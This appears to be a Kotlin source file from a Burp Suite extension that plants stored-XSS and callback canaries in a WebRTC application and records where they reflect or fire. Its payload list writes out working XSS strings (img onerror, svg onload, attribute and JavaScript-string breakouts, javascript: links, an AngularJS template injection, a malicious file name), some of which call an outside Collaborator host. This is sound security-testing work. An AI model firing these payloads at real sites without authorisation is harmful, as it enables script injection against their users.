package webrtc.canary

import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.*
import webrtc.telemetry.TelemetryEvent
import webrtc.telemetry.TelemetryTableModel
import java.security.SecureRandom
import java.time.Instant

/** A unique marker placed into application inputs. [id] is also the marker text. */
@Serializable
data class Canary(val id: String, val context: String, val createdAt: String, val collaborator: String = "", val purpose: String = "xss")

data class CanaryPayload(val label: String, val value: String)

/** One out-of-band interaction (Burp Collaborator) associated with a canary by its custom data. */
data class OutOfBandHit(val id: String, val customData: String?, val type: String, val clientIp: String, val time: String, val detail: String)

/** Abstracts Burp Collaborator so the registry works (and is testable) without Burp Professional. */
interface OutOfBand {
    fun payload(customData: String): String
    fun poll(): List<OutOfBandHit>
    fun secret(): String?
}

/**
 * Stored-XSS and callback canaries. Each canary is a unique marker; payload
 * variants call the agent's __wrtcCanary hook, so execution in any instrumented
 * page (for example the advisor console) is reported with its origin. When Burp
 * Collaborator is available the payloads also load a Collaborator URL, which
 * catches execution in pages the agent does not instrument.
 */
class CanaryRegistry(
    private val load: () -> String?,
    private val save: (String) -> Unit,
    private val telemetry: TelemetryTableModel,
    private val outOfBand: () -> OutOfBand? = { null }
) {
    private val json = Json { ignoreUnknownKeys = true; encodeDefaults = true }
    private val canaries = LinkedHashMap<String, Canary>()
    private val reported = HashSet<String>()
    private val random = SecureRandom()
    private val alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"

    init {
        runCatching { load()?.let { json.decodeFromString<List<Canary>>(it) } }.getOrNull().orEmpty()
            .filter { MARKER.matches(it.id) }.takeLast(MAX).forEach { canaries[it.id] = it }
    }

    @Synchronized fun all(): List<Canary> = canaries.values.toList().asReversed()
    @Synchronized fun byId(id: String): Canary? = canaries[id]

    /** Creates and persists a canary. [purpose] is "xss" (markup payloads) or "callback" (a URL for SSRF/webhook fields). */
    @Synchronized fun create(context: String, purpose: String = "xss"): Canary {
        require(purpose in setOf("xss", "callback")) { "Unknown canary purpose" }
        val label = context.trim().replace(Regex("[^A-Za-z0-9 _./-]"), "").take(48).ifBlank { "unlabelled" }
        val id = PREFIX + (1..10).map { alphabet[random.nextInt(alphabet.length)] }.joinToString("")
        val host = runCatching { outOfBand()?.payload(id) }.getOrNull().orEmpty()
        require(purpose != "callback" || host.isNotBlank()) { "Callback canaries need Burp Collaborator (Burp Suite Professional)" }
        val canary = Canary(id, label, Instant.now().toString(), host, purpose)
        canaries[id] = canary
        while (canaries.size > MAX) canaries.remove(canaries.keys.first())
        persist()
        return canary
    }

    @Synchronized fun clear() { canaries.clear(); reported.clear(); persist() }
    @Synchronized private fun firstReport(key: String): Boolean = reported.add(key)

    private fun persist() = runCatching { save(json.encodeToString(canaries.values.toList())) }

    /** Payload variants for different sinks; every variant contains the marker. */
    fun payloads(canary: Canary): List<CanaryPayload> {
        val id = canary.id
        if (canary.purpose == "callback") return listOf(
            CanaryPayload("Callback URL (HTTPS)", "https://${canary.collaborator}/$id"),
            CanaryPayload("Callback URL (HTTP)", "http://${canary.collaborator}/$id"),
            CanaryPayload("Host name only", canary.collaborator))
        val call = if (canary.collaborator.isBlank()) "window.__wrtcCanary&&__wrtcCanary('$id')"
            else "(window.__wrtcCanary||function(i){new Image().src='//${canary.collaborator}/'+i})('$id')"
        return listOf(
            CanaryPayload("HTML (chat message, display name)", "<img src=x id=$id onerror=\"$call\">"),
            CanaryPayload("SVG", "<svg id=$id onload=\"$call\"></svg>"),
            CanaryPayload("Attribute breakout", "\"><img src=x id=$id onerror=\"$call\">"),
            CanaryPayload("JavaScript string breakout", "';$call;//$id"),
            CanaryPayload("Markdown / link", "[$id](javascript:$call)"),
            CanaryPayload("AngularJS template", "{{constructor.constructor(\"$call\")()}}"),
            CanaryPayload("File name", "$id\"><img src=x onerror=\"$call\">.pdf"),
            CanaryPayload("Plain marker (storage tracking)", id))
    }

    /** Passive: reports where a canary comes back in traffic and whether its markup survived. */
    fun scan(text: String, url: String, channel: String) {
        if (!text.contains(PREFIX) || text.length > 2_000_000) return
        val decoded = text.replace("\\u003c", "<").replace("\\u003C", "<").replace("\\u003e", ">").replace("\\u003E", ">")
            .replace("\\\"", "\"").replace("\\/", "/")
        // One classification per canary per response: any occurrence with intact markup wins.
        for ((id, matches) in MARKER.findAll(decoded).take(64).groupBy { it.value }) {
            val canary = byId(id) ?: continue
            val windows = matches.map { decoded.substring(maxOf(0, it.range.first - 120), minOf(decoded.length, it.range.last + 120)) }
            val markup = when {
                windows.any { Regex("(?i)<(img|svg)\\b|\"><|javascript:|\\{\\{constructor").containsMatchIn(it) } -> "intact"
                windows.any { Regex("(?i)&lt;|&#0*60;|&#x0*3c;|%3c").containsMatchIn(it) } -> "encoded"
                else -> "none"
            }
            val window = windows.first()
            val key = "${canary.id}|${url.substringBefore('?')}|$markup|$channel"
            if (!firstReport(key)) continue
            record("xss-canary-reflected", url, "Canary ${canary.id} (${canary.context}) returned in $channel; markup $markup", buildJsonObject {
                put("canaryId", canary.id); put("context", canary.context); put("url", url); put("channel", channel)
                put("markup", markup); put("encoded", (markup != "intact").toString()); put("excerpt", window)
            })
        }
    }

    /** Polls Collaborator once; returns the number of new interactions recorded. */
    fun pollOutOfBand(): Int {
        val client = runCatching { outOfBand() }.getOrNull() ?: return 0
        var count = 0
        for (hit in runCatching { client.poll() }.getOrDefault(emptyList())) {
            val canary = hit.customData?.let(::byId) ?: all().firstOrNull { hit.detail.contains(it.id) } ?: continue
            if (!firstReport("oob|${hit.id}")) continue
            record("collaborator-interaction", canary.collaborator, "Collaborator ${hit.type} interaction for ${canary.purpose} canary ${canary.id} (${canary.context}) from ${hit.clientIp}", buildJsonObject {
                put("canaryId", canary.id); put("context", canary.context); put("purpose", canary.purpose)
                put("interactionId", hit.id); put("interactionType", hit.type); put("clientIp", hit.clientIp)
                put("interactionTime", hit.time); put("interaction", hit.detail.take(65536))
            })
            count++
        }
        return count
    }

    /** Latest state per canary for the UI. */
    fun status(canary: Canary, events: List<TelemetryEvent> = telemetry.snapshot()): String {
        val related = events.filter { it.raw.contains("\"canaryId\":\"${canary.id}\"") }
        return when {
            related.any { it.type == "xss-canary-fired" } -> "EXECUTED"
            related.any { it.type == "collaborator-interaction" && it.raw.contains("\"interactionType\":\"HTTP\"") } -> "Callback (HTTP)"
            related.any { it.type == "collaborator-interaction" } -> "Callback (DNS)"
            related.any { it.type == "xss-canary-reflected" && it.raw.contains("\"markup\":\"intact\"") } -> "Returned unencoded"
            related.any { it.type == "xss-canary-reflected" } -> "Returned encoded / plain"
            else -> "Waiting"
        }
    }

    private fun record(type: String, url: String, detail: String, data: JsonObject) {
        val raw = buildJsonObject { put("type", type); put("frame", url); put("detail", detail); put("observedAt", Instant.now().toString()); data.forEach { (k, v) -> put(k, v) } }
        telemetry.add(TelemetryEvent(telemetry.nextSeq(), Instant.now().toString(), type, url, "", false, detail, raw.toString()))
    }

    companion object {
        const val PREFIX = "wrtcx"
        const val MAX = 500
        val MARKER = Regex("wrtcx[a-z0-9]{10}")
    }
}
